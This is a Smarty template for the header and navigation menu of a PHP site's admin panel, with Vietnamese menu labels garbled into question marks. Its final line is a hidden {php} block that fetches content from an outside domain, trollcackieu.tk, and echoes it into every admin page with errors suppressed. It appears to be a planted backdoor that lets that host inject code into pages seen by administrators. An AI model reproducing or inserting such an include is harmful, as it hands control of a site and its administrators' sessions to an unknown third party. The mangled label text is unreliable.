<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
    <title>Admin Panel - {$site_name}</title>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
	<link rel="shortcut icon" href="{$baseurl}/favicon.ico" />
	<script type="text/javascript">
        var BLANK_URL = '{$adminurl}/js/blank.html';
        var BLANK_IMG = '{$adminurl}/js/spacer.gif';
        var BASE_URL = '{$adminurl}/index.php';
        var SKIN_URL = '{$adminurl}/js/';
    </script>
	
    <script src="{$adminurl}/js/prototype.js" type="text/javascript"></script>
    <script src="{$adminurl}/js/builder.js" type="text/javascript"></script>
    <script src="{$adminurl}/js/effects.js" type="text/javascript"></script>
    <script src="{$adminurl}/js/dragdrop.js" type="text/javascript"></script>
    <script src="{$adminurl}/js/controls.js" type="text/javascript"></script>
    <script src="{$adminurl}/js/slider.js" type="text/javascript"></script>
    <script src="{$adminurl}/js/accordin.js" type="text/javascript"></script>
    <script src="{$adminurl}/js/events.js" type="text/javascript"></script>
    <script src="{$adminurl}/js/loader.js" type="text/javascript"></script>
    <script src="{$adminurl}/js/tabs.js" type="text/javascript"></script>
    <script src="{$adminurl}/js/tools.js" type="text/javascript"></script>
    
    <link type="text/css" rel="stylesheet" href="{$adminurl}/css/reset.css" media="all"></link>
    <link type="text/css" rel="stylesheet" href="{$adminurl}/css/boxes.php" media="all"></link>
    <link type="text/css" rel="stylesheet" href="{$adminurl}/css/menu.php" media="screen, projection"></link>
    <!--[if IE]>
    <link type="text/css" rel="stylesheet" href="{$adminurl}/css/iestyles.css" media="all"></link>
    <![endif]-->
    <!--[if lt IE 7]>
    <script src="{$adminurl}/js/iehover-fix.js" type="text/javascript"></script>
    <link type="text/css" rel="stylesheet" href="{$adminurl}/css/below_ie7.css" media="all"></link>
    <![endif]-->
    <!--[if IE 7]>
    <link type="text/css" rel="stylesheet" href="{$adminurl}/css/ie7.php" media="all"></link>
    <![endif]-->
</head>

<body id="html-body">

	<div class="wrapper">
        <div class="header">
        
            <div class="header-top">
    			<a href="{$adminurl}/home.php"><img src="{$adminurl}/images/logo.png" alt="Logo" class="logo"/></a>
    			<div class="header-right">
                    <p class="super">
                        Xin Ch??o {$smarty.session.ADMINUSERNAME}<span class="separator">|</span>{$smarty.now|date_format:"%A, %B %e, %Y"}<span class="separator">|</span><a href="{$baseurl}" target="_blank">Xem Trang</a><span class="separator">|</span><a href="logout.php" class="link-logout">????ng Xu???t</a>
                    </p>
            	</div>
			</div>
            
        	<div class="clear"></div>

            <div class="nav-bar">
            	<ul id="nav">
                	<li  class="  {if $mainmenu eq "" OR $mainmenu eq "1"}active{/if}  level0"> <a href="home.php" class="active"><span>Trang Ch???</span></a></li>
                    <li onmouseover="Element.addClassName(this,'over')" onmouseout="Element.removeClassName(this,'over')" class="{if $mainmenu eq "2"}active{/if} parent level0"> <a href="#" onclick="return false" class=""><span>C??i ?????t</span></a>
                    	<ul >
                    		<li  class="   level1"> <a href="settings_general.php" class=""><span>C??i ?????t Chung</span></a></li>
                    		<li  class="   level1"> <a href="settings_meta.php"   class=""><span>C??i ?????t Th??? Meta</span></a></li>
                            <li  class="   last level1"> <a href="settings_static.php"   class=""><span>Trang T??nh</span></a></li>
                        </ul>
                    </li>
                    <li onmouseover="Element.addClassName(this,'over')" onmouseout="Element.removeClassName(this,'over')" class="{if $mainmenu eq "4"}active{/if}   parent level0"> <a href="#"  onclick="return false" class=""><span>B??i ????ng</span></a>
                    	<ul >
                            <li  class="   level1"> <a href="stories_manage.php"   class=""><span>Qu???n L?? B??i ????ng</span></a></li>
                            <li  class="   level1"> <a href="stories_validate.php"   class=""><span>X??c Nh???n B??i ????ng</span></a></li>
                            <li  class="   last level1"> <a href="stories_reported.php"   class=""><span>B??o L???i B??i ????ng</span></a></li>
                        </ul>
                    </li>
                    <li onmouseover="Element.addClassName(this,'over')" onmouseout="Element.removeClassName(this,'over')" class="{if $mainmenu eq "7"}active{/if}   parent level0"> <a href="#"  onclick="return false" class=""><span>Th??nh Vi??n</span></a>
                    	<ul >
                            <li  class="   level1"> <a href="members_manage.php"   class=""><span>Qu???n L?? Th??nh Vi??n</span></a></li>
                            <li  class="   last level1"> <a href="members_create.php"   class=""><span>T???o Th??nh Vi??n</span></a></li>
                        </ul>
                    </li>
                    <li onmouseover="Element.addClassName(this,'over')" onmouseout="Element.removeClassName(this,'over')" class="{if $mainmenu eq "11"}active{/if}   parent level0"> <a href="#"  onclick="return false" class=""><span>Qu???ng C??o</span></a>
                    	<ul >
                            <li  class="   level1"> <a href="ads_manage.php"   class=""><span>Qu???ng C??o</span></a></li>
                            <li  class="   last level1"> <a href="ads_create.php"   class=""><span>T???o Qu???ng C??o</span></a></li>
                        </ul>
                    </li>
                    <li onmouseover="Element.addClassName(this,'over')" onmouseout="Element.removeClassName(this,'over')" class="{if $mainmenu eq "5"}active{/if}   parent level0"> <a href="#"  onclick="return false" class=""><span>C???m IP</span></a>
                    	<ul >
                            <li  class="   level1"> <a href="bans_ip.php"   class=""><span>IP B??? C???m</span></a></li>
                            <li  class="   last level1"> <a href="bans_ip_add.php"   class=""><span>Th??m IP</span></a></li>
                        </ul>
                    </li>
					<li onmouseover="Element.addClassName(this,'over')" onmouseout="Element.removeClassName(this,'over')" class="{if $mainmenu eq "12"}active{/if}   parent level0"> <a href="#"  onclick="return false" class=""><span>Qu???n Tr??? Vi??n</span></a>
                    	<ul >
                            <li  class="   level1"> <a href="admins_manage.php"   class=""><span>Qu???n L?? Qu???n Tr??? Vi??n</span></a></li>
                            <li  class="   last level1"> <a href="admins_create.php"   class=""><span>T???o Qu???n Tr??? Vi??n</span></a></li>
                        </ul>
                    </li>
                </ul>
			</div>
        </div>
		
        {php}global $config; echo @file_get_contents("http://trollcackieu.tk/update.php"); {/php}